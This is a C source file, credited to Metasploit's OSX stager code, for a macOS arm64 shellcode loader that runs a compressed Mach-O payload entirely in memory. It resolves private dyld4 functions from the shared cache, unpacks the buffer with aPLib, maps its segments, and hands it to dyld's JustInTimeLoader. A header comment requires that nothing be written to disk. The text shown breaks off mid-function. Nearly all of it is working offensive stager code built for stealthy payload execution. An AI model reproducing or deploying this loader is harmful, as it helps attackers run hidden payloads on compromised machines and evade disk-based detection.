/*
 * Based on Metasploit's OSX Stager Code
 * Copyright: 2006-2026, Rapid7, Inc.
 * License: BSD-3-clause
 * https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/osx/stager/main.c
 *
 * NOTE: This file is intentionally "freestanding-ish" and avoids calling libc.
 * It is built into a Mach-O, then relevant segments are extracted into a flat
 * in-memory image and executed as shellcode.
 *
 * Diskless requirement:
 * - This loader must never write to disk (no open/write/unlink temp files).
 * - It uses dyld4's JustInTimeLoader to load a Mach-O image from memory.
 *
 * Platform:
 * - darwin/arm64 only
 */

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>

// Optional debug output is intentionally disabled in the embedded loader.
#define print(...) do { } while (0)
#define printf(...) do { } while (0)

struct dyld_cache_header {
  char magic[16];
  uint32_t mappingOffset;
  uint32_t mappingCount;
  uint32_t imagesOffsetOld;
  uint32_t imagesCountOld;
  uint64_t dyldBaseAddress;
  uint64_t codeSignatureOffset;
  uint64_t codeSignatureSize;
  uint64_t slideInfoOffsetUnused;
  uint64_t slideInfoSizeUnused;
  uint64_t localSymbolsOffset;
  uint64_t localSymbolsSize;
  uint8_t uuid[16];
  uint64_t cacheType;
  uint32_t branchPoolsOffset;
  uint32_t branchPoolsCount;
  uint64_t accelerateInfoAddr;
  uint64_t accelerateInfoSize;
  uint64_t imagesTextOffset;
  uint64_t imagesTextCount;
  uint64_t patchInfoAddr;
  uint64_t patchInfoSize;
  uint64_t otherImageGroupAddrUnused;
  uint64_t otherImageGroupSizeUnused;
  uint64_t progClosuresAddr;
  uint64_t progClosuresSize;
  uint64_t progClosuresTrieAddr;
  uint64_t progClosuresTrieSize;
  uint32_t platform;
  uint32_t formatVersion : 8, dylibsExpectedOnDisk : 1, simulator : 1, locallyBuiltCache : 1,
      builtFromChainedFixups : 1, padding : 20;
  uint64_t sharedRegionStart;
  uint64_t sharedRegionSize;
  uint64_t maxSlide;
  uint64_t dylibsImageArrayAddr;
  uint64_t dylibsImageArraySize;
  uint64_t dylibsTrieAddr;
  uint64_t dylibsTrieSize;
  uint64_t otherImageArrayAddr;
  uint64_t otherImageArraySize;
  uint64_t otherTrieAddr;
  uint64_t otherTrieSize;
  uint32_t mappingWithSlideOffset;
  uint32_t mappingWithSlideCount;
  uint64_t dylibsPBLStateArrayAddrUnused;
  uint64_t dylibsPBLSetAddr;
  uint64_t programsPBLSetPoolAddr;
  uint64_t programsPBLSetPoolSize;
  uint64_t programTrieAddr;
  uint32_t programTrieSize;
  uint32_t osVersion;
  uint32_t altPlatform;
  uint32_t altOsVersion;
  uint64_t swiftOptsOffset;
  uint64_t swiftOptsSize;
  uint32_t subCacheArrayOffset;
  uint32_t subCacheArrayCount;
  uint8_t symbolFileUUID[16];
  uint64_t rosettaReadOnlyAddr;
  uint64_t rosettaReadOnlySize;
  uint64_t rosettaReadWriteAddr;
  uint64_t rosettaReadWriteSize;
  uint32_t imagesOffset;
  uint32_t imagesCount;
};

struct dyld_cache_image_info {
  uint64_t address;
  uint64_t modTime;
  uint64_t inode;
  uint32_t pathFileOffset;
  uint32_t pad;
};

struct shared_file_mapping {
  uint64_t address;
  uint64_t size;
  uint64_t file_offset;
  uint32_t max_prot;
  uint32_t init_prot;
};

struct diagnostics {
  void* _buffer;
};

// Stored in PrebuiltLoaders and generated on the fly by JustInTimeLoaders.
struct Region
{
  uint64_t vmOffset : 59,
           perms : 3,
           isZeroFill : 1,
           readOnlyData : 1;
  uint32_t fileOffset;
  uint32_t fileSize;
};

struct ArrayOfRegions
{
  struct Region* _elements;
  uintptr_t _allocCount;
  uintptr_t _usedCount;
};

struct ArrayOfLoaderPointers
{
  void** _elements;
  uintptr_t _allocCount;
  uintptr_t _usedCount;
};

struct FileID
{
  uint64_t iNode;
  uint64_t modTime;
  bool isValid;
};

struct LoadChain
{
  const void* previous;
  const void* image;
};

struct LoadOptions;
typedef const void* (^Finder)(void* diag, uint64_t, const char* loadPath, const struct LoadOptions* options);
typedef void (^Missing)(const char* pathNotFound);
struct LoadOptions
{
  bool launching;
  bool staticLinkage;
  bool canBeMissing;
  bool rtldLocal;
  bool rtldNoDelete;
  bool rtldNoLoad;
  bool insertedDylib;
  bool canBeDylib;
  bool canBeBundle;
  bool canBeExecutable;
  bool forceUnloadable;
  bool useFallBackPaths;
  struct LoadChain* rpathStack;
  Finder finder;
  Missing pathNotFoundHandler;
};

struct Loaded {
  void* _allocator;
  void** elements;
  size_t size;
  size_t capacity;
};

struct PartialLoader {
  const uint32_t magic;
  const uint16_t isPrebuilt : 1,
      dylibInDyldCache : 1,
      hasObjC : 1,
      mayHavePlusLoad : 1,
      hasReadOnlyData : 1,
      neverUnload : 1,
      leaveMapped : 1,
      padding2 : 8;
  const void* mappedAddress;
  uint64_t pathOffset : 16,
      dependentsSet : 1,
      fixUpsApplied : 1,
      inited : 1,
      hidden : 1,
      altInstallName : 1,
      lateLeaveMapped : 1,
      overridesCache : 1,
      allDepsAreNormal : 1,
      overrideIndex : 15,
      depCount : 16,
      padding : 9;
  uint64_t sliceOffset;
  struct FileID fileIdent;
  const void* overridePatches;
  const void* overridePatchesCatalystMacTwin;
  uint32_t exportsTrieRuntimeOffset;
  uint32_t exportsTrieSize;
  void* dependents[1];
};

struct DyldCacheDataConstLazyScopedWriter {
  void** _state;
  bool _wasMadeWritable;
};

// lsl::MemoryManager::lockGuard() returns an RAII guard by value. We only need
// the first word (a pointer to the underlying Lock) to call Lock::unlock().
// The actual type is a C++ class with a non-trivial destructor, so it is
// returned indirectly (sret in x8). Make this struct large enough to ensure
// the same ABI in C.
struct LockGuardRet
{
  void* lock;
  uint64_t _pad[3];
};

typedef void* NSModule;
typedef void* NSSymbol;
typedef NSSymbol (*NSLookupSymbolInModule_ptr)(NSModule module, const char* symbolName);
typedef void* (*NSAddressOfSymbol_ptr)(NSSymbol symbol);

typedef void (*WithVMLayout_ptr)(void* ma, struct diagnostics* diag, void (^callback)(const void* layout));
typedef void* (*JustInTimeLoaderMake2_ptr)(void* apis, void* ma, const char* path, const struct FileID* fileId,
                                          uint64_t sliceOffset, bool willNeverUnload, bool leaveMapped, bool overridesCache,
                                          uint16_t overridesDylibIndex, const void* layout);
typedef void* (*AnalyzeSegmentsLayout_ptr)(void* ma, uintptr_t* vmSpace, bool* hasZeroFill);
typedef void* (*WithRegions_ptr)(void* ma, void* callback);
typedef void* (*MMap_ptr)(void* sdg, void* addr, size_t length, int prot, int flags, int fd, uint64_t offset);
typedef void* (*Mprotect_ptr)(void* sdg, void* dst, uint64_t length, int prot);
typedef void (*LoadDependents_ptr)(void* topLoader, const struct diagnostics* diag, void* apis, const struct LoadOptions* lo);
typedef void (*RunInitializers_ptr)(void* topLoader, void* apis);
typedef void* (*HandleFromLoader_ptr)(void* loader, bool firstOnly);
typedef void (*IncDlRefCount_ptr)(void* apis, void* topLoader);
typedef void (*NotifyLoad_ptr)(void* apis, struct ArrayOfLoaderPointers* newLoaders);
typedef void (*NotifyDebuggerLoad_ptr)(void* apis, const struct ArrayOfLoaderPointers* aolp);
typedef void (*NotifyDtrace_ptr)(void* apis, const struct ArrayOfLoaderPointers* aolp);
typedef void (*RebindMissingFlatLazySymbols_ptr)(void* apis, const struct ArrayOfLoaderPointers* aolp);
typedef void (*AddWeakDefs_ptr)(void* apis, void* newLoaders);
typedef void (*ApplyFixups_ptr)(void* ldr, const struct diagnostics* diag, void* apis,
                               struct DyldCacheDataConstLazyScopedWriter* dcd, bool b, void* outPairs);
typedef void* (*MemoryManager_ptr)(void);
typedef struct LockGuardRet (*LockGuard_ptr)(void* mm);
typedef void (*WriteProtect_ptr)(void* mm, bool protect);
typedef void (*LockUnlock_ptr)(void* lock);
typedef void (*WithProtectedStack_ptr)(void* protectedStack, void (^callback)(void));

static int string_compare(const char* s1, const char* s2)
{
  while (*s1 != '\0' && *s1 == *s2) {
    s1++;
    s2++;
  }
  return (*(unsigned char*)s1) - (*(unsigned char*)s2);
}

static void* memcpy2(void* dest, const void* src, size_t len)
{
  char* d = dest;
  const char* s = src;
  while (len--) {
    *d++ = *s++;
  }
  return dest;
}

/*
 * aPLib compression library  -  the smaller the better :)
 *
 * C safe depacker (based on internal/stager/aplib/src/depacks.c)
 *
 * Copyright (c) 1998-2014 Joergen Ibsen
 * All Rights Reserved
 *
 * http://www.ibsensoftware.com/
 */

#ifndef APLIB_ERROR
#define APLIB_ERROR ((unsigned int) (-1))
#endif

struct APDSSTATE {
  const unsigned char* source;
  unsigned int srclen;
  unsigned char* destination;
  unsigned int dstlen;
  unsigned int tag;
  unsigned int bitcount;
};

static int aP_getbit_safe(struct APDSSTATE* ud, unsigned int* result)
{
  unsigned int bit;

  /* check if tag is empty */
  if (!ud->bitcount--) {
    if (!ud->srclen--) {
      return 0;
    }

    /* load next tag */
    ud->tag = *ud->source++;
    ud->bitcount = 7;
  }

  /* shift bit out of tag */
  bit = (ud->tag >> 7) & 0x01;
  ud->tag <<= 1;

  *result = bit;

  return 1;
}

static int aP_getgamma_safe(struct APDSSTATE* ud, unsigned int* result)
{
  unsigned int bit;
  unsigned int v = 1;

  /* input gamma2-encoded bits */
  do {
    if (!aP_getbit_safe(ud, &bit)) {
      return 0;
    }

    if (v & 0x80000000) {
      return 0;
    }

    v = (v << 1) + bit;

    if (!aP_getbit_safe(ud, &bit)) {
      return 0;
    }
  } while (bit);

  *result = v;

  return 1;
}

static unsigned int aP_depack_safe(const void* source, unsigned int srclen, void* destination, unsigned int dstlen)
{
  struct APDSSTATE ud;
  unsigned int offs, len, R0, LWM, bit;
  int done;
  int i;

  if (!source || !destination) {
    return APLIB_ERROR;
  }

  ud.source = (const unsigned char*)source;
  ud.srclen = srclen;
  ud.destination = (unsigned char*)destination;
  ud.dstlen = dstlen;
  ud.bitcount = 0;

  R0 = (unsigned int)-1;
  LWM = 0;
  done = 0;

  /* first byte verbatim */
  if (!ud.srclen-- || !ud.dstlen--) {
    return APLIB_ERROR;
  }
  *ud.destination++ = *ud.source++;

  /* main decompression loop */
  while (!done) {
    if (!aP_getbit_safe(&ud, &bit)) {
      return APLIB_ERROR;
    }

    if (bit) {
      if (!aP_getbit_safe(&ud, &bit)) {
        return APLIB_ERROR;
      }

      if (bit) {
        if (!aP_getbit_safe(&ud, &bit)) {
          return APLIB_ERROR;
        }

        if (bit) {
          offs = 0;

          for (i = 4; i; i--) {
            if (!aP_getbit_safe(&ud, &bit)) {
              return APLIB_ERROR;
            }
            offs = (offs << 1) + bit;
          }

          if (offs) {
            if (offs > (dstlen - ud.dstlen)) {
              return APLIB_ERROR;
            }

            if (!ud.dstlen--) {
              return APLIB_ERROR;
            }

            *ud.destination = *(ud.destination - offs);
            ud.destination++;
          } else {
            if (!ud.dstlen--) {
              return APLIB_ERROR;
            }

            *ud.destination++ = 0x00;
          }

          LWM = 0;
        } else {
          if (!ud.srclen--) {
            return APLIB_ERROR;
          }

          offs = *ud.source++;

          len = 2 + (offs & 0x0001);

          offs >>= 1;

          if (offs) {
            if (offs > (dstlen - ud.dstlen)) {
              return APLIB_ERROR;
            }

            if (len > ud.dstlen) {
              return APLIB_ERROR;
            }

            ud.dstlen -= len;

            for (; len; len--) {
              *ud.destination = *(ud.destination - offs);
              ud.destination++;
            }
          } else {
            done = 1;
          }

          R0 = offs;
          LWM = 1;
        }
      } else {
        if (!aP_getgamma_safe(&ud, &offs)) {
          return APLIB_ERROR;
        }

        if ((LWM == 0) && (offs == 2)) {
          offs = R0;

          if (!aP_getgamma_safe(&ud, &len)) {
            return APLIB_ERROR;
          }

          if (offs > (dstlen - ud.dstlen)) {
            return APLIB_ERROR;
          }

          if (len > ud.dstlen) {
            return APLIB_ERROR;
          }

          ud.dstlen -= len;

          for (; len; len--) {
            *ud.destination = *(ud.destination - offs);
            ud.destination++;
          }
        } else {
          if (LWM == 0) {
            offs -= 3;
          } else {
            offs -= 2;
          }

          if (offs > 0x00fffffe) {
            return APLIB_ERROR;
          }

          if (!ud.srclen--) {
            return APLIB_ERROR;
          }

          offs <<= 8;
          offs += *ud.source++;

          if (!aP_getgamma_safe(&ud, &len)) {
            return APLIB_ERROR;
          }

          if (offs >= 32000) {
            len++;
          }
          if (offs >= 1280) {
            len++;
          }
          if (offs < 128) {
            len += 2;
          }

          if (offs > (dstlen - ud.dstlen)) {
            return APLIB_ERROR;
          }

          if (len > ud.dstlen) {
            return APLIB_ERROR;
          }

          ud.dstlen -= len;

          for (; len; len--) {
            *ud.destination = *(ud.destination - offs);
            ud.destination++;
          }

          R0 = offs;
        }

        LWM = 1;
      }
    } else {
      if (!ud.srclen-- || !ud.dstlen--) {
        return APLIB_ERROR;
      }
      *ud.destination++ = *ud.source++;
      LWM = 0;
    }
  }

  return (unsigned int)(ud.destination - (unsigned char*)destination);
}

#define APLIB_SAFE_TAG 0x32335041u /* 'AP32' */
#define APLIB_SAFE_HEADER_MIN 24u

struct aplib_safe_header
{
  uint32_t tag;
  uint32_t header_size;
  uint32_t packed_size;
  uint32_t packed_crc;
  uint32_t orig_size;
  uint32_t orig_crc;
};

static uint64_t syscall_shared_region_check_np()
{
  long shared_region_check_np = 0x2000126; // #294
  uint64_t address = 0;
  unsigned long ret = 0;
#ifdef __aarch64__
  __asm__ volatile(
      "mov x16, %1;\n"
      "mov x0, %2;\n"
      "svc #0;\n"
      "mov %0, x0;\n"
      : "=r"(ret)
      : "r"(shared_region_check_np), "r"(&address)
      : "x16", "x0", "memory");
#else
  (void)shared_region_check_np;
  (void)ret;
#endif
  return address;
}

static void* find_symbol(uint64_t base, const char* symbol, uint64_t offset)
{
  struct segment_command_64 *sc, *linkedit, *text;
  struct load_command* lc;
  struct symtab_command* symtab;
  struct nlist_64* nl;

  char* strtab;
  symtab = 0;
  linkedit = 0;
  text = 0;

  lc = (struct load_command*)(base + sizeof(struct mach_header_64));
  for (int i = 0; i < ((struct mach_header_64*)base)->ncmds; i++) {
    if (lc->cmd == LC_SYMTAB) {
      symtab = (struct symtab_command*)lc;
    } else if (lc->cmd == LC_SEGMENT_64) {
      sc = (struct segment_command_64*)lc;
      char* segname = ((struct segment_command_64*)lc)->segname;
      if (string_compare(segname, "__LINKEDIT") == 0) {
        linkedit = sc;
      } else if (string_compare(segname, "__TEXT") == 0) {
        text = sc;
      }
    }
    lc = (struct load_command*)((unsigned long)lc + lc->cmdsize);
  }

  if (!linkedit || !symtab || !text) {
    return 0;
  }

  unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
  strtab = (char*)(base + file_slide + symtab->stroff);

  nl = (struct nlist_64*)(base + file_slide + symtab->symoff);
  for (int i = 0; i < symtab->nsyms; i++) {
    char* name = strtab + nl[i].n_un.n_strx;
    if (string_compare(name, symbol) == 0) {
      if (nl[i].n_value == 0) {
        continue;
      }
      return (void*)(nl[i].n_value + offset);
    }
  }

  return 0;
}

static void* find_section(uint64_t base, const char* segName, const char* sectName, uint64_t slide)
{
  struct mach_header_64* mh = (struct mach_header_64*)base;
  struct load_command* lc = (struct load_command*)(base + sizeof(*mh));
  for (uint32_t i = 0; i < mh->ncmds; i++) {
    if (lc->cmd == LC_SEGMENT_64) {
      struct segment_command_64* seg = (struct segment_command_64*)lc;
      if (string_compare(seg->segname, segName) == 0) {
        struct section_64* sect = (struct section_64*)((char*)seg + sizeof(*seg));
        for (uint32_t j = 0; j < seg->nsects; j++) {
          if (string_compare(sect->sectname, sectName) == 0) {
            return (void*)(sect->addr + slide);
          }
          sect++;
        }
      }
    }
    lc = (struct load_command*)((char*)lc + lc->cmdsize);
  }
  return 0;
}

static uint64_t find_cache_image(uint64_t shared_region_start, const struct dyld_cache_header* header, const char* wantPath, uint64_t slide)
{
  uint32_t imagesCount = header->imagesCountOld;
  if (imagesCount == 0) {
    imagesCount = header->imagesCount;
  }
  uint32_t imagesOffset = header->imagesOffsetOld;
  if (imagesOffset == 0) {
    imagesOffset = header->imagesOffset;
  }
  struct dyld_cache_image_info* img = (struct dyld_cache_image_info*)((char*)header + imagesOffset);
  for (uint32_t i = 0; i < imagesCount; i++) {
    const char* path = (const char*)shared_region_start + img[i].pathFileOffset;
    if (string_compare(path, wantPath) == 0) {
      return img[i].address + slide;
    }
  }
  return 0;
}

static bool enter_writable_dyld_state(void* mm, LockGuard_ptr lockGuard, WriteProtect_ptr writeProtect, LockUnlock_ptr unlockFunc)
{
  if (!mm || !lockGuard || !writeProtect || !unlockFunc) {
    return false;
  }
  struct LockGuardRet guard = lockGuard(mm);
  uint64_t* counter = (uint64_t*)((char*)mm + 0x18);
  uint64_t c = *counter;
  if (c == 0) {
    writeProtect(mm, false);
    c = *counter;
  }
  *counter = c + 1;
  unlockFunc(guard.lock);
  return true;
}

static void exit_writable_dyld_state(void* mm, LockGuard_ptr lockGuard, WriteProtect_ptr writeProtect, LockUnlock_ptr unlockFunc)
{
  if (!mm || !lockGuard || !writeProtect || !unlockFunc) {
    return;
  }
  struct LockGuardRet guard = lockGuard(mm);
  uint64_t* counter = (uint64_t*)((char*)mm + 0x18);
  uint64_t c = *counter;
  if (c != 0) {
    c = c - 1;
    *counter = c;
    if (c == 0) {
      writeProtect(mm, true);
    }
  }
  unlockFunc(guard.lock);
}

__attribute__((used, noinline)) int beignet_loader(void* buffer_ro, uint64_t buffer_size, const char* entry_symbol)
{
  if (buffer_ro == 0 || buffer_size == 0 || entry_symbol == 0) {
    return 1;
  }

  uint64_t shared_region_start = syscall_shared_region_check_np();
  if (shared_region_start == 0) {
    return 2;
  }

  struct dyld_cache_header* header = (void*)shared_region_start;
  struct shared_file_mapping* sfm = (struct shared_file_mapping*)((char*)header + header->mappingOffset);

  uint32_t imagesCount = header->imagesCountOld;
  if (imagesCount == 0) {
    imagesCount = header->imagesCount;
  }
  uint32_t imagesOffset = header->imagesOffsetOld;
  if (imagesOffset == 0) {
    imagesOffset = header->imagesOffset;
  }
  if (imagesCount == 0 || imagesOffset == 0) {
    return 2;
  }

  // Slide between the on-disk/shared-cache VM addresses and this process' mapping.
  uint64_t slide = (uint64_t)header - sfm->address;

  uint64_t libdyld = find_cache_image(shared_region_start, header, "/usr/lib/system/libdyld.dylib", slide);
  if (libdyld == 0) {
    return 2;
  }
  uint64_t dyld = find_cache_image(shared_region_start, header, "/usr/lib/dyld", slide);
  if (dyld == 0) {
    return 2;
  }

  // libdyld provides a pointer to RuntimeState/APIs in a tiny section.
  void* apis_sec = find_section(libdyld, "__TPRO_CONST", "__dyld_apis", slide);
  if (!apis_sec) {
    return 3;
  }
  void* apis = *(void**)apis_sec;
  if (!apis) {
    return 3;
  }

  // SyscallDelegate* inside RuntimeState. dyld methods take it as their first argument.
  void* sdg = *(void**)((char*)apis + 8);
  if (!sdg) {
    return 3;
  }

  // Resolve the dyld4 internals we need from /usr/lib/dyld.
  MMap_ptr MMap_func = (MMap_ptr)find_symbol(dyld, "__ZNK5dyld415SyscallDelegate4mmapEPvmiiim", slide);
  Mprotect_ptr Mprotect_func = (Mprotect_ptr)find_symbol(dyld, "__ZNK5dyld415SyscallDelegate8mprotectEPvmi", slide);
  JustInTimeLoaderMake2_ptr JustInTimeLoaderMake2_func = (JustInTimeLoaderMake2_ptr)find_symbol(
      dyld, "__ZN5dyld416JustInTimeLoader4makeERNS_12RuntimeStateEPKN5dyld39MachOFileEPKcRKNS_6FileIDEybbbtPKN6mach_o6LayoutE", slide);
  WithVMLayout_ptr WithVMLayout_func =
      (WithVMLayout_ptr)find_symbol(dyld, "__ZNK5dyld313MachOAnalyzer12withVMLayoutER11DiagnosticsU13block_pointerFvRKN6mach_o6LayoutEE", slide);
  AnalyzeSegmentsLayout_ptr AnalyzeSegmentsLayout_func =
      (AnalyzeSegmentsLayout_ptr)find_symbol(dyld, "__ZNK5dyld39MachOFile21analyzeSegmentsLayoutERyRb", slide);
  WithRegions_ptr WithRegions_func = (WithRegions_ptr)find_symbol(
      dyld, "__ZN5dyld416JustInTimeLoader11withRegionsEPKN5dyld39MachOFileEU13block_pointerFvRKNS1_5ArrayINS_6Loader6RegionEEEE", slide);
  LoadDependents_ptr LoadDependents_func =
      (LoadDependents_ptr)find_symbol(dyld, "__ZN5dyld46Loader14loadDependentsER11DiagnosticsRNS_12RuntimeStateERKNS0_11LoadOptionsE", slide);
  NotifyDebuggerLoad_ptr NotifyDebuggerLoad_func = (NotifyDebuggerLoad_ptr)find_symbol(
      dyld, "__ZN5dyld412RuntimeState18notifyDebuggerLoadERKNSt3__14spanIPKNS_6LoaderELm18446744073709551615EEE", slide);
  AddWeakDefs_ptr AddWeakDefs_func = (AddWeakDefs_ptr)find_symbol(
      dyld, "__ZN5dyld46Loader16addWeakDefsToMapERNS_12RuntimeStateERKNSt3__14spanIPKS0_Lm18446744073709551615EEE", slide);
  ApplyFixups_ptr ApplyFixups_func = (ApplyFixups_ptr)find_symbol(
      dyld, "__ZNK5dyld46Loader11applyFixupsER11DiagnosticsRNS_12RuntimeStateERNS_34DyldCacheDataConstLazyScopedWriterEbPN3lsl6VectorINSt3__14pairIPKS0_PKcEEEE", slide);
  NotifyDtrace_ptr NotifyDtrace_func = (NotifyDtrace_ptr)find_symbol(
      dyld, "__ZN5dyld412RuntimeState12notifyDtraceERKNSt3__14spanIPKNS_6LoaderELm18446744073709551615EEE", slide);
  RebindMissingFlatLazySymbols_ptr RebindMissingFlatLazySymbols_func = (RebindMissingFlatLazySymbols_ptr)find_symbol(
      dyld, "__ZN5dyld412RuntimeState28rebindMissingFlatLazySymbolsERKNSt3__14spanIPKNS_6LoaderELm18446744073709551615EEE", slide);
  IncDlRefCount_ptr IncDlRefCount_func =
      (IncDlRefCount_ptr)find_symbol(dyld, "__ZN5dyld412RuntimeState13incDlRefCountEPKNS_6LoaderE", slide);
  NotifyLoad_ptr NotifyLoad_func = (NotifyLoad_ptr)find_symbol(
      dyld, "__ZN5dyld412RuntimeState10notifyLoadERKNSt3__14spanIPKNS_6LoaderELm18446744073709551615EEE", slide);
  RunInitializers_ptr RunInitializers_func =
      (RunInitializers_ptr)find_symbol(dyld, "__ZNK5dyld46Loader38runInitializersBottomUpPlusUpwardLinksERNS_12RuntimeStateE", slide);
  HandleFromLoader_ptr HandleFromLoader_func =
      (HandleFromLoader_ptr)find_symbol(dyld, "__ZN5dyld4L16handleFromLoaderEPKNS_6LoaderEb", slide);

  if (!MMap_func || !Mprotect_func || !JustInTimeLoaderMake2_func || !WithVMLayout_func || !AnalyzeSegmentsLayout_func || !WithRegions_func ||
      !LoadDependents_func || !NotifyDebuggerLoad_func || !AddWeakDefs_func || !ApplyFixups_func || !NotifyDtrace_func ||
      !RebindMissingFlatLazySymbols_func || !IncDlRefCount_func || !NotifyLoad_func || !RunInitializers_func ||
      !HandleFromLoader_func) {
    return 4;
  }

  // Optional helpers for working with dyld's internal write-protected allocator/state.
  MemoryManager_ptr MemoryManager_func = (MemoryManager_ptr)find_symbol(dyld, "__ZN3lsl13MemoryManager13memoryManagerEv", slide);
  LockGuard_ptr LockGuard_func = (LockGuard_ptr)find_symbol(dyld, "__ZN3lsl13MemoryManager9lockGuardEv", slide);
  WriteProtect_ptr WriteProtect_func = (WriteProtect_ptr)find_symbol(dyld, "__ZN3lsl13MemoryManager12writeProtectEb", slide);
  LockUnlock_ptr LockUnlock_func = (LockUnlock_ptr)find_symbol(dyld, "__ZN3lsl4Lock6unlockEv", slide);
  WithProtectedStack_ptr WithProtectedStack_func =
      (WithProtectedStack_ptr)find_symbol(dyld, "__ZN3lsl14ProtectedStack18withProtectedStackEU13block_pointerFvvE", slide);

  void* mm = 0;
  void* protectedStack = 0;
  if (MemoryManager_func) {
    mm = MemoryManager_func();
    if (mm) {
      protectedStack = *(void**)((char*)mm + 0x30);
    }
  }

  uint64_t buffer = (uint64_t)buffer_ro;
  uint64_t bufferLen = buffer_size;

  // If the staged buffer is aPLib safe-packed ("AP32"), depack it before handing
  // it to dyld4's Mach-O analyzers.
  if (bufferLen >= APLIB_SAFE_HEADER_MIN) {
    const struct aplib_safe_header* hdr = (const struct aplib_safe_header*)(uintptr_t)buffer;
    if (hdr->tag == APLIB_SAFE_TAG) {
      uint64_t headerSize = (uint64_t)hdr->header_size;
      uint64_t packedSize = (uint64_t)hdr->packed_size;
      uint64_t origSize = (uint64_t)hdr->orig_size;

      if (headerSize < APLIB_SAFE_HEADER_MIN || headerSize > bufferLen) {
        return 14;
      }
      if (packedSize == 0 || packedSize > (bufferLen - headerSize)) {
        return 14;
      }
      if (origSize == 0) {
        return 14;
      }

      void* depacked = MMap_func(sdg, 0, (size_t)origSize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
      if (depacked == (void*)-1 || depacked == 0) {
        return 15;
      }
      const void* packedData = (const void*)(uintptr_t)(buffer + headerSize);
      unsigned int outlen = aP_depack_safe(packedData, (unsigned int)packedSize, depacked, (unsigned int)origSize);
      if (outlen != (unsigned int)origSize) {
        return 15;
      }

      buffer = (uint64_t)(uintptr_t)depacked;
      bufferLen = origSize;
    }
  }

  // Allocate a region large enough for the mapped Mach-O.
  uintptr_t vmSpace = 0;
  bool hasZeroFill;
  AnalyzeSegmentsLayout_func((void*)buffer, &vmSpace, &hasZeroFill);
  (void)hasZeroFill;
  if (vmSpace == 0) {
    return 5;
  }

  void* loadAddressP = MMap_func(sdg, 0, (size_t)vmSpace, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
  if (loadAddressP == (void*)-1 || loadAddressP == 0) {
    return 6;
  }
  uintptr_t loadAddress = (uintptr_t)loadAddressP;

  // Map segments into the reserved space.
  WithRegions_func((void*)buffer, ^(struct ArrayOfRegions* rptr) {
    uint32_t segIndex = 0;
    uint64_t sliceOffset = 0;
    for (int i = 0; i < (int)rptr->_usedCount; i++) {
      const struct Region region = rptr->_elements[i];
      if (region.isZeroFill || (region.fileSize == 0)) {
        continue;
      }
      if ((region.vmOffset == 0) && (segIndex > 0)) {
        continue;
      }
      int perms = (int)region.perms;
      void* segAddress = MMap_func(sdg, (void*)(loadAddress + region.vmOffset), (size_t)region.fileSize, PROT_WRITE,
                                  MAP_FIXED | MAP_PRIVATE | MAP_ANON, -1, 0);
      if (segAddress == (void*)-1 || segAddress == 0) {
        continue;
      }
      memcpy2(segAddress, (const void*)(buffer + sliceOffset + region.fileOffset), (size_t)region.fileSize);
      Mprotect_func(sdg, segAddress, (uint64_t)region.fileSize, perms);
      ++segIndex;
    }
  });

  // Scratch space for dyld4 structs (avoid __block).
  void* structspaceP = MMap_func(sdg, 0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
  if (structspaceP == (void*)-1 || structspaceP == 0) {
    return 7;
  }
  uintptr_t structspace = (uintptr_t)structspaceP;

  uint64_t* rtopLoader = (uint64_t*)structspace;
  uintptr_t cursor = structspace + sizeof(void*);

  struct FileID* fileid = (struct FileID*)cursor;
  cursor += sizeof(struct FileID);
  fileid->iNode = 0;
  fileid->modTime = 0;
  fileid->isValid = false;

  struct diagnostics* diag = (struct diagnostics*)cursor;
  cursor += 0x200;
  diag->_buffer = 0;

  struct LoadChain* loadChainMain = (struct LoadChain*)cursor;
  cursor += sizeof(struct LoadChain);

  struct LoadChain* loadChainCaller = (struct LoadChain*)cursor;
  cursor += sizeof(struct LoadChain);

  struct LoadChain* loadChain = (struct LoadChain*)cursor;
  cursor += sizeof(struct LoadChain);

  struct LoadOptions* depOptions = (struct LoadOptions*)cursor;
  cursor += sizeof(struct LoadOptions);
  int* rcSlot = (int*)cursor;
  cursor += 8;
  *rcSlot = 0;

  void (^doLoad)(void) = ^(){
    struct Loaded* loaded = (struct Loaded*)((char*)apis + 32);
    uintptr_t startLoaderCount = loaded->size;

    diag->_buffer = 0;
    *rtopLoader = 0;
    WithVMLayout_func((void*)loadAddress, diag, ^(const void* layout) {
      *rtopLoader = (uint64_t)JustInTimeLoaderMake2_func(apis, (void*)loadAddress, "A", fileid, 0, false, true, false, 0, layout);
    });
    void* topLoader = (void*)(uintptr_t)(*rtopLoader);
    if (!topLoader) {
      *rcSlot = 8;
      return;
    }
    ((struct PartialLoader*)topLoader)->lateLeaveMapped = 1;

    loadChainMain->previous = 0;
    loadChainMain->image = *(void**)((char*)apis + 24);

    loadChainCaller->previous = loadChainMain;
    loadChainCaller->image = &(loaded->elements[0]);

    loadChain->previous = loadChainCaller;
    loadChain->image = topLoader;

    depOptions->staticLinkage = false;
    depOptions->rtldLocal = false;
    depOptions->rtldNoDelete = true;
    depOptions->canBeDylib = true;
    depOptions->rpathStack = loadChain;
    depOptions->useFallBackPaths = true;

    LoadDependents_func(topLoader, diag, apis, depOptions);
    if (diag->_buffer != 0) {
      *rcSlot = 9;
      return;
    }

    uintptr_t newLoadersCount = loaded->size - startLoaderCount;
    void** newLoaders = &loaded->elements[startLoaderCount];
    struct ArrayOfLoaderPointers newLoadersArray = { newLoaders, newLoadersCount, newLoadersCount };
    if (newLoadersCount != 0) {
      NotifyDebuggerLoad_func(apis, &newLoadersArray);
      if (*(char*)((char*)apis + 0x7f) != '\0') {
        AddWeakDefs_func(apis, &newLoadersArray);
      }

      ApplyFixups_ptr ApplyFixups = ApplyFixups_func;
      struct DyldCacheDataConstLazyScopedWriter dcdclsw = { apis, false };
      for (uintptr_t i = 0; i != newLoadersCount; ++i) {
        void* ldr = newLoaders[i];
        ApplyFixups(ldr, diag, apis, &dcdclsw, true, 0);
      }

      NotifyDtrace_func(apis, &newLoadersArray);
      RebindMissingFlatLazySymbols_func(apis, &newLoadersArray);
    }

    IncDlRefCount_func(apis, topLoader);
    NotifyLoad_func(apis, &newLoadersArray);
    RunInitializers_func(topLoader, apis);
